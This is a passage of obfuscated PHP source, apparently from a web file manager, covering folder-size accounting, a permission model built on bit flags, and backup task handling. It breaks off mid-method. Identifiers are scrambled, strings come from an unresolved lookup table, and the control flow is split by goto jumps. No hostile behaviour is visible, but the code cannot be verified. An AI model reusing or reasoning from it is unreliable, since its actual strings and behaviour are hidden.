$üšäÜÄŸ = $this->sourceInfo($ÉüóÔ»†); $•§¸Ö‰ = array($èö¯§„ñ[401] => $ÉüóÔ»†, $èö¯§„ñ[430] => 0); $¢©ŠáéÒ = $this->where($•§¸Ö‰)->sum($èö¯§„ñ[76]); $Í±Ïñìİ = intval($¢©ŠáéÒ) - intval($üšäÜÄŸ[$èö¯§„ñ[76]]); } if ($Í±Ïñìİ == 0) { return CacheLock::unlock($ÒŠ˜ÙÉ); } $·‡òæ€æ = $this->parentLevelArray($üšäÜÄŸ[$èö¯§„ñ[511]]); if (!$·‡òæ€æ) { $·‡òæ€æ = array(); } $·‡òæ€æ[] = $üšäÜÄŸ[$èö¯§„ñ[402]]; $•§¸Ö‰ = array($èö¯§„ñ[402] => array($èö¯§„ñ[418], $·‡òæ€æ)); if ($Í±Ïñìİ < 0) { $•§¸Ö‰[$èö¯§„ñ[76]] = array($èö¯§„ñ[1022], abs($Í±Ïñìİ)); } $this->where($•§¸Ö‰)->setAdd($èö¯§„ñ[76], $Í±Ïñìİ); CacheLock::unlock($ÒŠ˜ÙÉ); $ö°àˆéŠ = $èö¯§„ñ[2167] . $üšäÜÄŸ[$èö¯§„ñ[411]] . $èö¯§„ñ[4] . $üšäÜÄŸ[$èö¯§„ñ[496]]; $É´¢Ï‡¬ = array($üšäÜÄŸ[$èö¯§„ñ[411]], $üšäÜÄŸ[$èö¯§„ñ[496]]); TaskRun::timeLimitCall($ö°àˆéŠ, $èö¯§„ñ[2168], $É´¢Ï‡¬, 1.5); } public function folderSizeResetChildren($¡ãè©üæ) { $Ä„®š” =& $_SERVER[å¸¿•¶£]; $this->sourceCacheClear($¡ãè©üæ); $•…Ò…õí = $this->sourceInfo($¡ãè©üæ); $Ö ãú = array($Ä„®š”[574] => 1, $Ä„®š”[577] => $•…Ò…õí[$Ä„®š”[496]], $Ä„®š”[580] => array($Ä„®š”[540], $•…Ò…õí[$Ä„®š”[511]] . $¡ãè©üæ . $Ä„®š”[541])); $ö…¡¦ô = $Ä„®š”[2169]; $¨Üîˆü = $this->field($ö…¡¦ô)->where($Ö ãú)->select(); $Ö ãú[$Ä„®š”[410]] = 0; $ô˜ˆ = $this->field($ö…¡¦ô)->where($Ö ãú)->select(); if (!$ô˜ˆ) { return; } $¨Üîˆü[] = $•…Ò…õí; $¨Üîˆü = array_to_keyvalue($¨Üîˆü, $Ä„®š”[402]); foreach ($¨Üîˆü as $ÖÅˆé– => $»ä¯›») { $¨Üîˆü[$ÖÅˆé–][$Ä„®š”[2170]] = $¨Üîˆü[$ÖÅˆé–][$Ä„®š”[76]]; $¨Üîˆü[$ÖÅˆé–][$Ä„®š”[76]] = 0; } foreach ($ô˜ˆ as $»ä¯›») { $¿Âåõ„Ç = $»ä¯›»[$Ä„®š”[432]] . $Ä„®š”[12]; if (!isset($¨Üîˆü[$¿Âåõ„Ç])) { continue; } if ($»ä¯›»[$Ä„®š”[431]] == $¨Üîˆü[$¿Âåõ„Ç][$Ä„®š”[431]]) { $¨Üîˆü[$¿Âåõ„Ç][$Ä„®š”[76]] += $»ä¯›»[$Ä„®š”[76]]; } } foreach ($¨Üîˆü as $»ä¯›») { $†òÍÑíÆ = $this->parentLevelArray($»ä¯›»[$Ä„®š”[511]]); foreach ($†òÍÑíÆ as $¿Âåõ„Ç) { $¿Âåõ„Ç = $¿Âåõ„Ç . $Ä„®š”[12]; if (!isset($¨Üîˆü[$¿Âåõ„Ç])) { continue; } if ($»ä¯›»[$Ä„®š”[431]] == $¨Üîˆü[$¿Âåõ„Ç][$Ä„®š”[431]]) { $¨Üîˆü[$¿Âåõ„Ç][$Ä„®š”[76]] += $»ä¯›»[$Ä„®š”[76]]; } } } $Ã¿¨ÖŠ› = array(); foreach ($¨Üîˆü as $»ä¯›») { if ($»ä¯›»[$Ä„®š”[76]] == $»ä¯›»[$Ä„®š”[2170]]) { continue; } $Ã¿¨ÖŠ›[] = array($Ä„®š”[402], $»ä¯›»[$Ä„®š”[402]], $Ä„®š”[76], $»ä¯›»[$Ä„®š”[76]]); } $this->saveAll($Ã¿¨ÖŠ›); } public function userSpaceReset($‘Ê§÷ë = false) { $Àğ¦Š–¥ =& $_SERVER[å¸¿•¶£]; $¤‘êã¥ù = $this->where(array($Àğ¦Š–¥[411] => self::TYPE_USER, $Àğ¦Š–¥[496] => $‘Ê§÷ë, $Àğ¦Š–¥[410] => 0))->sum($Àğ¦Š–¥[76]); $¤‘êã¥ù = !$¤‘êã¥ù || $¤‘êã¥ù <= 0 ? 0 : $¤‘êã¥ù; Model($Àğ¦Š–¥[504])->userEdit($‘Ê§÷ë, array($Àğ¦Š–¥[1852] => $¤‘êã¥ù)); } public function targetSpaceUpdate($ÁšÙĞÉ¼, $€‰“è¬ö) { $ò»¤ñû =& $_SERVER[å¸¿•¶£]; if (!$€‰“è¬ö) { return; } if (!in_array($ÁšÙĞÉ¼, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $üğ—Êİ× = $this->targetSpaceSize($ÁšÙĞÉ¼, $€‰“è¬ö); if ($ÁšÙĞÉ¼ == self::TYPE_USER) { Model($ò»¤ñû[504])->userEdit($€‰“è¬ö, array($ò»¤ñû[1852] => $üğ—Êİ×)); } else { if ($ÁšÙĞÉ¼ == self::TYPE_GROUP) { Model($ò»¤ñû[512])->groupEdit($€‰“è¬ö, array($ò»¤ñû[1852] => $üğ—Êİ×)); } } } public function targetSpaceSize($ÚÆÔâÇ¶, $Ç®æ“É´) { $ÌòŸí¬³ =& $_SERVER[å¸¿•¶£]; $Ø¼®ÉÂö = 0; $‘ú°ß·œ = $this->targetSourceRoot($ÚÆÔâÇ¶, $Ç®æ“É´, !0); foreach ($‘ú°ß·œ as $‘¶ä®ÈÜ) { if (!$‘¶ä®ÈÜ) { continue; } $Ø¼®ÉÂö += floatval($‘¶ä®ÈÜ[$ÌòŸí¬³[76]]); $Á´ş¢Ø = array($ÌòŸí¬³[580] => array($ÌòŸí¬³[540], $ÌòŸí¬³[521] . $‘¶ä®ÈÜ[$ÌòŸí¬³[402]] . $ÌòŸí¬³[541])); $…âú¸—ê = Model($ÌòŸí¬³[429])->field($ÌòŸí¬³[417])->where($Á´ş¢Ø)->select(); $…âú¸—ê = array_to_keyvalue($…âú¸—ê, $ÌòŸí¬³[12], $ÌòŸí¬³[402]); $…âú¸—ê = array_unique(array_filter($…âú¸—ê)); if ($…âú¸—ê) { $Á´ş¢Ø = array($ÌòŸí¬³[417] => array($ÌòŸí¬³[418], $…âú¸—ê)); $Ø¼®ÉÂö += floatval($this->where($Á´ş¢Ø)->sum($ÌòŸí¬³[76])); } } $Ø¼®ÉÂö = !$Ø¼®ÉÂö || $Ø¼®ÉÂö <= 0 ? 0 : $Ø¼®ÉÂö; return $Ø¼®ÉÂö; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($ö™³¬çÄ) { return $this->fileTypeProfile($ö™³¬çÄ, SourceModel::TYPE_USER); } public function groupFileTypeProfile($›üó¯ä) { return $this->fileTypeProfile($›üó¯ä, SourceModel::TYPE_GROUP); } private function fileTypeProfile($Ëˆöºø , $Öá¯µ‘) { $ éßº¯ï =& $_SERVER[å¸¿•¶£]; $ñÀî®¬ = $ éßº¯ï[2171] . $Ëˆöºø  . $ éßº¯ï[11] . $Öá¯µ‘; $¬±¢ğä‚ = Cache::get($ñÀî®¬); if ($¬±¢ğä‚) { return $¬±¢ğä‚; } $Ì°Óûª• = array($ éßº¯ï[574] => 0); if ($Ëˆöºø  != !1) { $Ì°Óûª•[$ éßº¯ï[496]] = $Ëˆöºø ; $Ì°Óûª•[$ éßº¯ï[411]] = $Öá¯µ‘; } $êëÙ ŠÖ = array(); $êëÙ ŠÖ[$ éßº¯ï[2172]] = array($ éßº¯ï[2173] => LNG($ éßº¯ï[2172]), $ éßº¯ï[2174] => $this->where($Ì°Óûª•)->count(), $ éßº¯ï[545] => $this->where($Ì°Óûª•)->sum($ éßº¯ï[76])); $îÊ½¢‚– = KodIO::fileTypeList(); foreach ($îÊ½¢‚– as $¨˜õ¯ÅÂ => $§İÇÍÓ) { $Ì°Óûª•[$ éßº¯ï[412]] = $this->fileTypeWhere($¨˜õ¯ÅÂ); $êëÙ ŠÖ[$¨˜õ¯ÅÂ] = array($ éßº¯ï[2173] => $§İÇÍÓ[$ éßº¯ï[32]], $ éßº¯ï[2174] => $this->where($Ì°Óûª•)->count(), $ éßº¯ï[545] => $this->where($Ì°Óûª•)->sum($ éßº¯ï[76])); } Cache::set($ñÀî®¬, $êëÙ ŠÖ, 1200); return $êëÙ ŠÖ; } public function fileNameExist($¥®ÚŠ£, $ä€˜×î‡) { $å™Àªğ =& $_SERVER[å¸¿•¶£]; $â¸òÔÔÂ = $this->where(array($å™Àªğ[432] => $¥®ÚŠ£, $å™Àªğ[32] => $ä€˜×î‡, $å™Àªğ[431] => 0))->find(); return is_array($â¸òÔÔÂ) ? $â¸òÔÔÂ[$å™Àªğ[402]] : !1; } public function childList($ä‚íıáª) { $Ğ÷³Ùûş =& $_SERVER[å¸¿•¶£]; $·¹¦¬¾ = $Ğ÷³Ùûş[2149] . $ä‚íıáª; if (isset(self::$cacheChildList[$·¹¦¬¾])) { return self::$cacheChildList[$·¹¦¬¾]; } $ÅÇ·¬£Î = array($Ğ÷³Ùûş[432] => intval($ä‚íıáª), $Ğ÷³Ùûş[431] => 0); $äàËù¡ = $this->where($ÅÇ·¬£Î)->select(); $äàËù¡ = $äàËù¡ ? $äàËù¡ : array(); self::$cacheChildList[$·¹¦¬¾] = $äàËù¡; foreach ($äàËù¡ as $Â×‡óÑ) { $·¹¦¬¾ = $Ğ÷³Ùûş[460] . $Â×‡óÑ[$Ğ÷³Ùûş[402]]; self::$cacheSourceInfo[$·¹¦¬¾] = $Â×‡óÑ; } return $äàËù¡; } public function fileNameAuto($ğèæœ™­, $ÊÃ¥ÓÅš, $ñÚà–‹´ = REPEAT_RENAME, $Æü”áÓÌ = false) { $ÌŠ»°“» =& $_SERVER[å¸¿•¶£]; $ºçĞ¯¼å = get_path_ext($ÊÃ¥ÓÅš); $õá¥©Ÿ = $ºçĞ¯¼å ? basename($ÊÃ¥ÓÅš, $ÌŠ»°“»[10] . $ºçĞ¯¼å) . $ÌŠ»°“»[2175] . $ºçĞ¯¼å : $ÊÃ¥ÓÅš . $ÌŠ»°“»[384]; $›ñÚ¯³¼ = array($ÌŠ»°“»[432] => $ğèæœ™­, $ÌŠ»°“»[431] => 0, $ÌŠ»°“»[32] => array($ÌŠ»°“»[383], $õá¥©Ÿ)); $‚…Ê·¥ú = $this->field($ÌŠ»°“»[32])->where($›ñÚ¯³¼)->select(); $¥òé•É = array_to_keyvalue($‚…Ê·¥ú, $ÌŠ»°“»[12], $ÌŠ»°“»[32]); return $this->fileNameAutoGet($¥òé•É, $ÊÃ¥ÓÅš, $ñÚà–‹´, $Æü”áÓÌ); } public function fileNameAutoGet($×÷şí, $ôëãù­˜, $‡ÖœÜƒª, $ Ç÷‘Ğã) { $¢àğ÷øÜ =& $_SERVER[å¸¿•¶£]; if ($‡ÖœÜƒª == REPEAT_REPLACE || !$×÷şí || !in_array_not_case($ôëãù­˜, $×÷şí) || $ Ç÷‘Ğã && $‡ÖœÜƒª != REPEAT_RENAME_FOLDER) { return $ôëãù­˜; } if ($‡ÖœÜƒª == REPEAT_SKIP) { return !1; } $Œİ¯„×œ = $¢àğ÷øÜ[10] . get_path_ext($ôëãù­˜); $Œİ¯„×œ = $Œİ¯„×œ == $¢àğ÷øÜ[10] || $ Ç÷‘Ğã ? $¢àğ÷øÜ[12] : $Œİ¯„×œ; for ($–ÁÕ®Ã÷ = 1; $–ÁÕ®Ã÷ <= count($×÷şí) + 1; $–ÁÕ®Ã÷++) { $¸˜Ó”úá = substr($ôëãù­˜, 0, strlen($ôëãù­˜) - strlen($Œİ¯„×œ)); $¸º¸¡ÉÎ = $¸˜Ó”úá . "\50{$–ÁÕ®Ã÷}\x29{$Œİ¯„×œ}"; if (!in_array_not_case($¸º¸¡ÉÎ, $×÷şí)) { return $¸º¸¡ÉÎ; } } } } goto a‘ÜĞ¦Í‘‡; F®š »çãÍ: class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $ğ·©Ûğ =& $_SERVER[å¸¿•¶£]; $à¹Ÿ€ìŠ = array(array($ğ·©Ûğ[420] => LNG($ğ·©Ûğ[1864]), $ğ·©Ûğ[1865] => $ğ·©Ûğ[1866], $ğ·©Ûğ[1867] => 1, $ğ·©Ûğ[1868] => 1, $ğ·©Ûğ[1869] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($ğ·©Ûğ[420] => LNG($ğ·©Ûğ[1870]), $ğ·©Ûğ[1865] => $ğ·©Ûğ[1871], $ğ·©Ûğ[1867] => 2, $ğ·©Ûğ[1868] => 1, $ğ·©Ûğ[1869] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($ğ·©Ûğ[420] => LNG($ğ·©Ûğ[1872]), $ğ·©Ûğ[1865] => $ğ·©Ûğ[1873], $ğ·©Ûğ[1867] => 3, $ğ·©Ûğ[1868] => 1, $ğ·©Ûğ[1869] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($ğ·©Ûğ[420] => LNG($ğ·©Ûğ[1874]), $ğ·©Ûğ[1865] => $ğ·©Ûğ[1875], $ğ·©Ûğ[1867] => 4, $ğ·©Ûğ[1868] => 1, $ğ·©Ûğ[1869] => self::AUTH_SHOW | self::AUTH_VIEW), array($ğ·©Ûğ[420] => LNG($ğ·©Ûğ[1876]), $ğ·©Ûğ[1865] => $ğ·©Ûğ[1877], $ğ·©Ûğ[1867] => 5, $ğ·©Ûğ[1868] => 1, $ğ·©Ûğ[1869] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($ğ·©Ûğ[420] => LNG($ğ·©Ûğ[1878]), $ğ·©Ûğ[1865] => $ğ·©Ûğ[1879], $ğ·©Ûğ[1867] => 6, $ğ·©Ûğ[1868] => 1, $ğ·©Ûğ[1869] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($ğ·©Ûğ[420] => LNG($ğ·©Ûğ[1880]), $ğ·©Ûğ[1865] => $ğ·©Ûğ[1881], $ğ·©Ûğ[1867] => 7, $ğ·©Ûğ[1868] => 1, $ğ·©Ûğ[1869] => 0)); return $à¹Ÿ€ìŠ; } public static function authCheck($Ğßùòü‹, $®Ñ¤Õ·¯) { $Í”´Îè =& $_SERVER[å¸¿•¶£]; $Ğßùòü‹ = intval($Ğßùòü‹); if ($GLOBALS[$Í”´Îè[494]] && $GLOBALS[$Í”´Îè[6]][$Í”´Îè[1882]]) { return !0; } if ($Ğßùòü‹ <= 0) { return !1; } if (($Ğßùòü‹ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($Ğßùòü‹ & $®Ñ¤Õ·¯); } public static function authCheckShow($ŸÍÔ¨¹÷) { return self::authCheck($ŸÍÔ¨¹÷, self::AUTH_SHOW); } public static function authCheckView($‘êæåàÇ) { return self::authCheck($‘êæåàÇ, self::AUTH_VIEW); } public static function authCheckDownload($¤…»¶ä«) { return self::authCheck($¤…»¶ä«, self::AUTH_DOWNLOAD); } public static function authCheckUpload($ª±Ì»Âß) { return self::authCheck($ª±Ì»Âß, self::AUTH_UPLOAD); } public static function authCheckEdit($öµ«½îø) { return self::authCheck($öµ«½îø, self::AUTH_EDIT); } public static function authCheckRemove($ª÷ã¶îĞ) { return self::authCheck($ª÷ã¶îĞ, self::AUTH_REMOVE); } public static function authCheckShare($èé—øİÎ) { return self::authCheck($èé—øİÎ, self::AUTH_SHARE); } public static function authCheckComment($Ï„Âçìş) { return self::authCheck($Ï„Âçìş, self::AUTH_COMMENT); } public static function authCheckEvent($ïéÇĞí‘) { return self::authCheck($ïéÇĞí‘, self::AUTH_EVENT); } public static function authCheckRoot($´õ¶¨õ´) { return self::authCheck($´õ¶¨õ´, self::AUTH_ROOT); } public static function authCheckAction($¯­µ½í, $ †À±×) { $šñ¬°™‚ =& $_SERVER[å¸¿•¶£]; $–´ô”ğı = array($šñ¬°™‚[1883] => self::AUTH_VIEW, $šñ¬°™‚[1201] => self::AUTH_DOWNLOAD, $šñ¬°™‚[107] => self::AUTH_UPLOAD, $šñ¬°™‚[1833] => self::AUTH_EDIT, $šñ¬°™‚[1832] => self::AUTH_REMOVE, $šñ¬°™‚[1843] => self::AUTH_SHARE, $šñ¬°™‚[354] => self::AUTH_COMMENT, $šñ¬°™‚[1662] => self::AUTH_EVENT, $šñ¬°™‚[1884] => self::AUTH_ROOT); if (!isset($–´ô”ğı[$ †À±×])) { return; } $¤¢Ï×¦ = $–´ô”ğı[$ †À±×]; $¯­µ½í = intval($¯­µ½í); if ($¯­µ½í <= 0) { return !1; } if (($¯­µ½í & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($¯­µ½í & $¤¢Ï×¦); } public static function authDisable($Øßüµê, $Ú…£ù²) { if (intval($Øßüµê) <= 0) { return 0; } return intval($Øßüµê) & ~$Ú…£ù²; } public $optionType = "\x53\x79\x73\x74\145\x6d\56\x73\x6f\x75\162\143\145\x41\165\x74\150\114\x69\163\x74"; public $field = array("\156\x61\155\145", "\x61\165\x74\x68", "\154\x61\142\145\x6c", "\x64\151\163\x70\154\141\x79", "\163\171\x73\x74\x65\155", "\163\x6f\162\164"); public function initData() { $ãøš±¶® = $this->authDefault(); foreach ($ãøš±¶® as $Ô•õÅ×) { $this->add($Ô•õÅ×); } } public function findAuth($¿ØÕŒò’, $ûéŸØ¿¦) { $ãˆà†€ =& $_SERVER[å¸¿•¶£]; $§‹ùî = parent::listData(); foreach ($§‹ùî as $‡Ÿ¯­ï) { $âõâ­ş = intval($‡Ÿ¯­ï[$ãˆà†€[413]]); if ($âõâ­ş <= 0 || $‡Ÿ¯­ï[$ãˆà†€[1885]] == 0) { continue; } if (($âõâ­ş & $¿ØÕŒò’) != $¿ØÕŒò’) { continue; } if (($âõâ­ş & $ûéŸØ¿¦) != 0) { continue; } return $‡Ÿ¯­ï[$ãˆà†€[399]]; } return !1; } public function findAuthReadOnly() { $íÕ¶Öšñ = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $ ¨³Ò¿Ş = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($íÕ¶Öšñ, $ ¨³Ò¿Ş); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function findAuthMinDefault() { $ÖÂÜ€õÃ =& $_SERVER[å¸¿•¶£]; $›¦êß – = parent::listData(); $”¢¼†ï = !1; foreach ($›¦êß – as $á¬×Ğ«â) { if ($á¬×Ğ«â[$ÖÂÜ€õÃ[413]] <= 0 || $á¬×Ğ«â[$ÖÂÜ€õÃ[1885]] == $ÖÂÜ€õÃ[198]) { continue; } if (!$”¢¼†ï) { $”¢¼†ï = $á¬×Ğ«â; continue; } if ($”¢¼†ï[$ÖÂÜ€õÃ[413]] > $á¬×Ğ«â[$ÖÂÜ€õÃ[413]]) { $”¢¼†ï = $á¬×Ğ«â; } } return $”¢¼†ï ? $”¢¼†ï[$ÖÂÜ€õÃ[399]] : $ÖÂÜ€õÃ[12]; } public function listData($ı¨ğ‰İ = false, $ÚÇı¦ø = "\163\157\162\x74", $à“´’Ï = false) { return parent::listData($ı¨ğ‰İ, $ÚÇı¦ø, $à“´’Ï); } public function update($êîÚÔ¡†, $Ø¤Á„ú) { $”÷€‚›ë =& $_SERVER[å¸¿•¶£]; $§öæÏš„ = parent::listData($êîÚÔ¡†); $Ô­ÇÆºÙ = $this->findByName($Ø¤Á„ú[$”÷€‚›ë[32]]); if (!$§öæÏš„ || $Ô­ÇÆºÙ && $Ô­ÇÆºÙ[$”÷€‚›ë[399]] != $§öæÏš„[$”÷€‚›ë[399]]) { return !1; } $this->filterAuth($Ø¤Á„ú[$”÷€‚›ë[413]]); return parent::update($êîÚÔ¡†, $Ø¤Á„ú); } public function remove($¾Ó©Í‡œ) { $Û ™ä” = parent::listData($¾Ó©Í‡œ); if (!$Û ™ä” || $Û ™ä”[$_SERVER[å¸¿•¶£][1291]]) { return !1; } return parent::remove($¾Ó©Í‡œ); } public function add($ğÈŞ¶Ç = array()) { $í´Ì¯ğÆ =& $_SERVER[å¸¿•¶£]; if ($this->findByName($ğÈŞ¶Ç[$í´Ì¯ğÆ[32]])) { return !1; } $éô–éè¸ = array($í´Ì¯ğÆ[32] => $í´Ì¯ğÆ[12], $í´Ì¯ğÆ[413] => 1, $í´Ì¯ğÆ[1886] => $í´Ì¯ğÆ[1873], $í´Ì¯ğÆ[1885] => 1, $í´Ì¯ğÆ[1291] => 0, $í´Ì¯ğÆ[1887] => 0); $ğÈŞ¶Ç = array_merge($éô–éè¸, $ğÈŞ¶Ç); $ğÈŞ¶Ç[$í´Ì¯ğÆ[1887]] = $this->getSort(); $this->filterAuth($ğÈŞ¶Ç[$í´Ì¯ğÆ[413]]); return parent::insert($ğÈŞ¶Ç); } private function getSort() { $÷Óñö®˜ =& $_SERVER[å¸¿•¶£]; $Ì†œ´Âş = parent::listData(); $·ä‘ò§º = array_to_keyvalue($Ì†œ´Âş, $÷Óñö®˜[12], $÷Óñö®˜[1887]); return empty($·ä‘ò§º) ? 0 : max($·ä‘ò§º) + 1; } private function filterAuth(&$ÆœòãÃ¾) { if (!$ÆœòãÃ¾) { return; } $ìì´æ§ = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $¼„‡°íÀ = array(); foreach ($ìì´æ§ as $ı˜ö¹¶ì) { if ($ÆœòãÃ¾ & $ı˜ö¹¶ì) { $¼„‡°íÀ[] = $ı˜ö¹¶ì; } } if (in_array(self::AUTH_ROOT, $¼„‡°íÀ)) { $ÆœòãÃ¾ = array_sum($ìì´æ§); return; } $ÍÁÆæŞ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($¼„‡°íÀ as $ı˜ö¹¶ì) { if (isset($ÍÁÆæŞ[$ı˜ö¹¶ì])) { $¼„‡°íÀ = array_merge($¼„‡°íÀ, $ÍÁÆæŞ[$ı˜ö¹¶ì]); } } $¼„‡°íÀ[] = self::AUTH_SHOW; $ÆœòãÃ¾ = array_sum(array_unique($¼„‡°íÀ)); } public function sort($üü“ü, $ÖÓú¢¾‚) { return parent::update($üü“ü, $ÖÓú¢¾‚); } } class BackupModel extends ModelBaseLight { public $optionType = "\x53\x79\163\164\x65\x6d\56\x62\x61\143\153\165\160\x4c\151\163\164"; public $field = array("\151\x6f", "\156\x61\155\145", "\x73\x74\141\x74\165\x73", "\x63\x6f\x6e\x74\145\x6e\164", "\155\141\156\165\141\x6c", "\162\145\163\x75\154\x74", "\164\151\x6d\145\106\x72\x6f\155", "\x74\x69\155\x65\124\157"); public function config() { $¿óƒ³Ô³ =& $_SERVER[å¸¿•¶£]; $˜¬¸÷à© = Model($¿óƒ³Ô³[777])->get($¿óƒ³Ô³[787]); $˜¬¸÷à© = json_decode($˜¬¸÷à©, !0); $˜¬¸÷à© = is_array($˜¬¸÷à©) ? $˜¬¸÷à© : array(); if (!isset($˜¬¸÷à©[$¿óƒ³Ô³[761]])) { $˜¬¸÷à©[$¿óƒ³Ô³[761]] = $¿óƒ³Ô³[88]; } unset($˜¬¸÷à©[$¿óƒ³Ô³[1644]]); Action($¿óƒ³Ô³[1888])->taskInit(); Model($¿óƒ³Ô³[1643])->cacheClear(); $øö¥çİ„ = $¿óƒ³Ô³[1889]; $®â²ÄÔˆ = Model($¿óƒ³Ô³[1890])->findByKey($¿óƒ³Ô³[1662], $øö¥çİ„); if (!$®â²ÄÔˆ) { $®â²ÄÔˆ = array(); } if (isset($®â²ÄÔˆ[$¿óƒ³Ô³[180]])) { $®â²ÄÔˆ[$¿óƒ³Ô³[180]] = json_decode($®â²ÄÔˆ[$¿óƒ³Ô³[180]], !0); } if (isset($˜¬¸÷à©[$¿óƒ³Ô³[180]])) { $®â²ÄÔˆ[$¿óƒ³Ô³[180]][$¿óƒ³Ô³[1647]] = $˜¬¸÷à©[$¿óƒ³Ô³[180]]; unset($˜¬¸÷à©[$¿óƒ³Ô³[180]]); } return array_merge($®â²ÄÔˆ, $˜¬¸÷à©); } public function listData($­—òÇº« = false, $Œü›×ƒ† = "\x6d\x6f\144\x69\146\x79\x54\x69\x6d\x65", $Á¢¥²ú… = false) { return parent::listData($­—òÇº«, $Œü›×ƒ†, !0); } public function lastItem() { $…üÀå³ = $this->listData(); return !empty($…üÀå³[0]) ? $…üÀå³[0] : null; } public function kill($ƒ‰ÈÀÕ) { $ª«µ¥ =& $_SERVER[å¸¿•¶£]; $ÚîãÙ© = $this->listData($ƒ‰ÈÀÕ); if (!$ÚîãÙ© || empty($ÚîãÙ©[$ª«µ¥[32]])) { return !0; } Task::kill($ª«µ¥[786]); Task::kill($ª«µ¥[807]); Task::kill($ª«µ¥[816]); $Úï§¹áÁ = $ÚîãÙ©[$ª«µ¥[32]]; $ò›äÀŒÍ = TEMP_FILES . $ª«µ¥[785] . $Úï§¹áÁ . $ª«µ¥[8]; IO::remove($ò›äÀŒÍ, !1); return $this->remove($ƒ‰ÈÀÕ); } public function remove($á“ïÒÆÇ) { $†ıöÚø = $this->listData($á“ïÒÆÇ); if (!$†ıöÚø) { return !0; } return $this->backupRemove($†ıöÚø); } private function backupRemove($Ùİ„Ë¤½) { parent::remove($Ùİ„Ë¤½[$_SERVER[å¸¿•¶£][399]]); $ßäŸµÓ† = $this->backupPath($Ùİ„Ë¤½); IO::remove($ßäŸµÓ†, !1); return !0; } private function backupPath($ˆî³×ó›) { $Å¯æ¶´Œ =& $_SERVER[å¸¿•¶£]; $È¾€¶ûÏ = $ˆî³×ó›[$Å¯æ¶´Œ[32]]; $§Ù‰°‘ó = Model($Å¯æ¶´Œ[777])->get($Å¯æ¶´Œ[778]); $ ”÷Ç¨Õ = substr(md5($Å¯æ¶´Œ[779] . $§Ù‰°‘ó . $È¾€¶ûÏ), 0, 8); return "\x7b\x69\x6f\72{$ˆî³×ó›[$Å¯æ¶´Œ[758]]}\175\57\x64\x61\164\x61\x62\x61\163\x65\57\x62\x61\143\x6b\165\x70\x2f" . $È¾€¶ûÏ . $Å¯æ¶´Œ[11] . $ ”÷Ç¨Õ; } public function start() { $“ØÛ®Ò  =& $_SERVER[å¸¿•¶£]; if ($GLOBALS[$“ØÛ®Ò [6]][$“ØÛ®Ò [89]][$“ØÛ®Ò [1891]] != $“ØÛ®Ò [88]) { return !0; } $Ó½×¼Æò = $this->config(); if (!$Ó½×¼Æò || $Ó½×¼Æò[$“ØÛ®Ò [1644]] != $“ØÛ®Ò [88]) { return !1; } $»··ˆÄ = $this->process(); foreach ($»··ˆÄ as $÷–ü¢·) { if ($÷–ü¢·) { return Task::restart($÷–ü¢·[$“ØÛ®Ò [399]]); } } $õÅÂ ˜¸ = new Backup(); $‹Ùğ±¹˜ = $õÅÂ ˜¸->db(); if ($‹Ùğ±¹˜) { $‹Ùğ±¹˜ = $õÅÂ ˜¸->dbFile(); if ($‹Ùğ±¹˜ && $Ó½×¼Æò[$“ØÛ®Ò [761]] == $“ØÛ®Ò [198]) { $‹Ùğ±¹˜ = $õÅÂ ˜¸->file(); } } Backup::set(array($“ØÛ®Ò [756] => 1, $“ØÛ®Ò [768] => time())); return !0; } public function process() { $È²å²Õ =& $_SERVER[å¸¿•¶£]; $ãÛâê”ù = array($È²å²Õ[764] => Task::get($È²å²Õ[786]), $È²å²Õ[769] => Task::get($È²å²Õ[807]), $È²å²Õ[200] => Task::get($È²å²Õ[816])); $üò†çÑ– = !1; foreach ($ãÛâê”ù as &$¡‰ÌÂë) { if ($üò†çÑ–) { $¡‰ÌÂë = !1; continue; } if ($¡‰ÌÂë) { $œñÚ½Œä = intval(_get($¡‰ÌÂë, $È²å²Õ[1679], 0)); if (time() - $œñÚ½Œä > 7200) { Task::kill($¡‰ÌÂë[$È²å²Õ[399]]); $üò†çÑ– = !0; $¡‰ÌÂë = !1; } } } return $ãÛâê”ù; } public function restore() { $ÍšÉŞ† =& $_SERVER[å¸¿•¶£]; ActionCall($ÍšÉŞ†[1067], 